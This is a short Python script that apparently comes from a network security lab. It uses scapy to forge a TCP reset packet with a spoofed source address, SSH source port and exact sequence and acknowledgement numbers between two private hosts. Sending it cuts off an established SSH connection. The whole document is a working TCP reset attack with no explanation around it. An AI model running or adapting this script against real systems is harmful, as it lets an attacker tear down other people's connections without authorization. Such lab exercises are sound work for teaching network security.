#!/usr/bin/python3
from scapy.all import *
ip = IP(src="172.16.133.128", dst="172.16.133.130")
tcp = TCP(sport=22, dport=48856, flags="R", seq=1588241279,
ack=1428638390)
pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)